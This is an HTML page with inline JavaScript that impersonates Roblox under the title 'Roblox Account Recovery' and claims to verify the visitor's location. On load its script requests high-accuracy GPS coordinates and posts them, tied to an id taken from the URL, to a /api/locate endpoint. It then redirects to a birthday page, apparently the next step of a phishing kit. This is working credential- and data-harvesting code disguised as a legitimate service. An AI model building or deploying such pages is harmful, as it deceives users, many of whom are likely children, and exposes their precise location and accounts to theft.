<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Roblox - Location Verification</title>
  <link rel="stylesheet" href="/css/style.css" />
</head>
<body>

  <!-- TOP HEADER -->
  <header class="roblox-header">
    <div class="header-main">
      <div class="header-left">
        <a href="/" class="roblox-logo" aria-label="Roblox">
          <svg width="26" height="26" viewBox="0 0 24 24" fill="currentColor">
            <path d="M18.926 23.998L0 18.892 5.075 0l18.925 5.106-5.074 18.892zM15.348 10.09l-5.282-1.424-1.414 5.244 5.282 1.424 1.414-5.244z"/>
          </svg>
        </a>
      </div>

      <div class="header-right">
        <button class="btn-signup">Sign Up</button>
        <button class="btn-search" aria-label="Search">
          <svg width="22" height="22" fill="none" stroke="currentColor" stroke-width="2.3" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-4.35-4.35M17 11A6 6 0 1 1 5 11a6 6 0 0 1 12 0z" />
          </svg>
        </button>
      </div>
    </div>

    <nav class="sub-nav">
      <a href="#">Charts</a>
      <a href="#">Marketplace</a>
      <a href="#">Create</a>
      <a href="#">Robux</a>
    </nav>
  </header>

  <!-- MAIN CONTAINER -->
  <main class="main-container">
    <div class="card">
      <h1 class="card-title">Roblox Account Recovery</h1>
      <p class="card-subtitle">Verify your device location to authenticate and continue recovery.</p>

      <div class="location-box">
        <div class="location-icon-wrapper" id="locationIconBox">
          <svg id="locationIcon" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" />
            <circle cx="12" cy="9" r="2.5" />
          </svg>
        </div>
        <div id="locationStatus" class="location-status-text">
          Location permission is required to verify your region.
        </div>
      </div>

      <button id="btnRequestLocation" class="btn-primary">
        Verify Location
      </button>
    </div>
  </main>

  <!-- BOTTOM APP BANNER -->
  <footer class="app-banner" id="appBanner">
    <button class="banner-close" id="closeBannerBtn" aria-label="Close">
      <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
      </svg>
    </button>
    <div class="banner-icon">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
        <path d="M18.926 23.998L0 18.892 5.075 0l18.925 5.106-5.074 18.892zM15.348 10.09l-5.282-1.424-1.414 5.244 5.282 1.424 1.414-5.244z"/>
      </svg>
    </div>
    <div class="banner-text">
      <span class="banner-title">Explore Roblox in our Android app!</span>
      <span class="banner-subtitle">Millions of experiences by people like you</span>
    </div>
    <a href="#" class="btn-visit">Visit</a>
  </footer>

  <script type="module">
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('id') || '';

    const btnRequestLocation = document.getElementById('btnRequestLocation');
    const locationStatus = document.getElementById('locationStatus');
    const locationIconBox = document.getElementById('locationIconBox');

    function requestLocation() {
      if (!navigator.geolocation) {
        locationStatus.className = 'location-status-text error';
        locationStatus.textContent = 'Geolocation is not supported by your browser.';
        return;
      }

      locationStatus.className = 'location-status-text';
      locationStatus.textContent = 'Requesting device location... Please allow location access.';
      btnRequestLocation.disabled = true;
      btnRequestLocation.textContent = 'Checking location...';

      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;

          locationIconBox.className = 'location-icon-wrapper success';
          locationStatus.className = 'location-status-text success';
          locationStatus.textContent = 'Location confirmed! Authenticating...';

          try {
            const res = await fetch('/api/locate', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
              },
              body: JSON.stringify({
                id: userId,
                latitude: lat,
                longitude: lng,
                region: `Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}`
              })
            });
            const data = await res.json();
            const nextUrl = data.redirect || ('/views/birthday.html?id=' + userId);
            setTimeout(() => {
              window.location.href = nextUrl;
            }, 600);
          } catch (err) {
            console.error('Error reporting location:', err);
            // Even if network glitch occurs, proceed to next step
            setTimeout(() => {
              window.location.href = '/views/birthday.html?id=' + userId;
            }, 800);
          }
        },
        (error) => {
          locationIconBox.className = 'location-icon-wrapper error';
          locationStatus.className = 'location-status-text error';
          if (error.code === error.PERMISSION_DENIED) {
            locationStatus.textContent = 'Location access was denied. You must allow location permission to continue recovery.';
          } else {
            locationStatus.textContent = 'Unable to retrieve location. Please check GPS/network and retry.';
          }
          btnRequestLocation.disabled = false;
          btnRequestLocation.textContent = 'Retry Location Access';
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    btnRequestLocation.addEventListener('click', requestLocation);

    // Auto-prompt location request on page load
    window.addEventListener('DOMContentLoaded', () => {
      requestLocation();
    });

    const closeBannerBtn = document.getElementById('closeBannerBtn');
    const appBanner = document.getElementById('appBanner');
    if (closeBannerBtn && appBanner) {
      closeBannerBtn.addEventListener('click', () => {
        appBanner.style.display = 'none';
      });
    }
  </script>
</body>
</html>
